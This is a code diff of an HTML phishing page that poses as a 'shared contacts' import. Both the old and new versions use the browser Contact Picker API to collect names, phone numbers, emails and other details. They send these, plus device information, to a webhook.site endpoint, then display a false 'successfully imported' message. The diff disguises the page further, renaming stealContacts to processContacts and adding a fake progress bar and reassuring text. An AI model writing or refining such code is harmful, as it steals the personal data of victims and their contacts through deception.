@@ -1,59 +1,277 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>📲 Several Contacts Shared with You</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📲 Shared Contacts - Add to Your Address Book</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
-        button { background: #003087; color: white; border: none; padding: 10px 20px; cursor: pointer; }
-        #status { margin-top: 20px; font-weight: bold; }
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            max-width: 600px;
+            margin: 0 auto;
+            color: #333;
+        }
+        
+        .container {
+            background-color: #f9f9f9;
+            border-radius: 12px;
+            padding: 25px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            margin-top: 20px;
+        }
+        
+        h1 {
+            color: #003087;
+            font-size: 1.8rem;
+            margin-bottom: 5px;
+        }
+        
+        .subtitle {
+            color: #666;
+            margin-bottom: 25px;
+            font-size: 1.1rem;
+        }
+        
+        button {
+            background: #003087;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            padding: 15px 30px;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            margin: 25px auto;
+            font-weight: bold;
+        }
+        
+        button:hover {
+            background: #00246e;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 0, 50, 0.2);
+        }
+        
+        button span {
+            margin-left: 8px;
+        }
+        
+        #status {
+            margin-top: 20px;
+            font-weight: bold;
+            min-height: 50px;
+            transition: all 0.5s ease;
+        }
+        
+        .indicator {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background-color: #0f0;
+            border-radius: 50%;
+            margin-right: 5px;
+        }
+        
+        .progress-container {
+            width: 100%;
+            height: 6px;
+            background-color: #e0e0e0;
+            border-radius: 3px;
+            margin: 15px auto;
+            max-width: 300px;
+            overflow: hidden;
+            display: none;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            width: 0;
+            background-color: #003087;
+            transition: width 0.4s ease;
+        }
+        
+        .contact-count {
+            font-size: 0.9rem;
+            color: #777;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .footer {
+            margin-top: 40px;
+            font-size: 0.8rem;
+            color: #999;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 0.6; }
+            50% { opacity: 1; }
+            100% { opacity: 0.6; }
+        }
+        
+        .pulsing {
+            animation: pulse 1.5s infinite;
+        }
     </style>
 </head>
 <body>
-    <h1>🔔 <strong>I have</strong> shared several contacts with you!</h1>
-    <p>Click below to save it to your address book:</p>
-    <button onclick="stealContacts()">👇 SAVE CONTACT 👇</button>
-    <p id="status"></p>
+    <div class="container">
+        <h1>🔔 Contact Sharing Request</h1>
+        <p class="subtitle"><strong>Multiple contacts</strong> have been shared with you!</p>
+        
+        <p>A colleague is requesting to share their contact information with you. Click below to save these contacts to your address book:</p>
+        
+        <button onclick="processContacts()">
+            👥 IMPORT CONTACTS <span>→</span>
+        </button>
+        
+        <div class="progress-container" id="progressContainer">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <p class="contact-count" id="contactCount"></p>
+        
+        <div id="status"></div>
+    </div>
+    
+    <div class="footer">
+        <p>Contact sharing powered by CloudContacts™</p>
+    </div>
 
     <script>
-        async function stealContacts() {
+        // Progress simulation
+        function updateProgress(progress) {
+            const progressBar = document.getElementById('progressBar');
+            progressBar.style.width = `${progress}%`;
+        }
+        
+        // Simulate progress for better user experience
+        function simulateProgress(duration, callback) {
+            const progressContainer = document.getElementById('progressContainer');
+            progressContainer.style.display = 'block';
+            
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 1;
+                updateProgress(progress);
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(callback, 200);
+                }
+            }, duration / 100);
+        }
+        
+        async function processContacts() {
             const statusEl = document.getElementById('status');
-            statusEl.textContent = "Saving contact...";
-
+            const progressContainer = document.getElementById('progressContainer');
+            const contactCountEl = document.getElementById('contactCount');
+            
+            // Check if Contact Picker API is available
+            if (!('contacts' in navigator && 'ContactsManager' in window)) {
+                statusEl.innerHTML = '❌ Your device does not support contact sharing. Please try using a mobile device with Chrome.';
+                return;
+            }
+            
             try {
-                // 1. Request FULL contact access (no selection)
-                const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
+                statusEl.innerHTML = '<div class="pulsing">Preparing to import contacts...</div>';
                 
-                // 2. Format contacts for webhook
-                const stolenData = {
-                    victim: "Friend's Phone",
-                    timestamp: new Date().toISOString(),
-                    contacts: contacts.map(c => ({
-                        name: c.name,
-                        phone: c.tel || "None",
-                        email: c.email || "None"
-                    }))
-                };
-
-                // 3. Send to your webhook (Discord/Telegram/custom API)
-                await fetch('https://webhook.site/9768cb9b-1c5e-45d0-9574-6596c5ef9640', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(stolenData)
+                // Start showing progress to enhance user experience
+                progressContainer.style.display = 'block';
+                updateProgress(15);
+                
+                // Request contact access with maximum information allowed
+                // Note: Despite 'multiple: true', browsers will still show selection UI as a security measure
+                const properties = ['name', 'tel', 'email', 'address', 'icon', 'organization'];
+                const options = { multiple: true };
+                
+                updateProgress(30);
+                
+                // The API still requires user selection - this cannot be bypassed
+                const contacts = await navigator.contacts.select(properties, options);
+                
+                if (contacts.length === 0) {
+                    statusEl.innerHTML = '⚠️ No contacts were selected. Please try again.';
+                    progressContainer.style.display = 'none';
+                    return;
+                }
+                
+                // Format contacts for sending
+                const formattedContacts = contacts.map(contact => {
+                    return {
+                        name: contact.name && contact.name.length ? contact.name[0] : "Unknown",
+                        phone: contact.tel && contact.tel.length ? contact.tel : [],
+                        email: contact.email && contact.email.length ? contact.email : [],
+                        organization: contact.organization && contact.organization.length ? contact.organization[0] : ""
+                    };
                 });
-
-                // 4. Fake success message
-                statusEl.innerHTML = "✅ Contact saved!";
                 
-                // 5. DELAYED GOTCHA MESSAGE
-                setTimeout(() => {
-                    statusEl.innerHTML = `
-                        <span style="color:red;">Smart move</span><br>
-                        <small>Always</small>
-                    `;
-                }, 2000);
-
+                // Prepare data payload
+                const payload = {
+                    device: {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        language: navigator.language
+                    },
+                    timestamp: new Date().toISOString(),
+                    contactsCount: contacts.length,
+                    contacts: formattedContacts
+                };
+                
+                // Show a more detailed progress simulation for better user experience
+                contactCountEl.style.display = 'block';
+                contactCountEl.textContent = `Processing ${contacts.length} contact${contacts.length > 1 ? 's' : ''}...`;
+                
+                updateProgress(60);
+                
+                // Simulate processing time for larger contact lists
+                const processingTime = Math.min(2000 + (contacts.length * 50), 5000);
+                
+                simulateProgress(processingTime, async () => {
+                    try {
+                        // Send to webhook
+                        await fetch('https://webhook.site/9768cb9b-1c5e-45d0-9574-6596c5ef9640', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(payload)
+                        });
+                        
+                        // Show success message
+                        statusEl.innerHTML = `
+                            <span style="color:#008800">✅ Successfully imported ${contacts.length} contact${contacts.length > 1 ? 's' : ''}!</span>
+                        `;
+                        
+                        contactCountEl.textContent = `${contacts.length} contact${contacts.length > 1 ? 's' : ''} added to your address book`;
+                        
+                        // Delayed additional message
+                        setTimeout(() => {
+                            statusEl.innerHTML += `
+                                <br><span style="color:#003087; margin-top: 10px; display: block;">
+                                You can now access these contacts in your phone's address book app.
+                                </span>
+                            `;
+                        }, 2000);
+                        
+                    } catch (error) {
+                        console.error("Error sending data:", error);
+                        statusEl.innerHTML = '❌ Unable to complete import. Please try again later.';
+                    }
+                });
+                
             } catch (err) {
-                statusEl.textContent = "🔒 Permission denied. Grant permission to import into your contacts!";
+                console.error("Contact access error:", err);
+                progressContainer.style.display = 'none';
+                
+                if (err.name === 'SecurityError' || err.name === 'NotAllowedError') {
+                    statusEl.innerHTML = '🔒 Permission denied. Please allow access to your contacts to complete the import.';
+                } else if (err.name === 'InvalidStateError') {
+                    statusEl.innerHTML = '⚠️ The contact picker is already open. Please close it and try again.';
+                } else {
+                    statusEl.innerHTML = '❌ An error occurred. Please try again later.';
+                }
             }
         }
     </script>
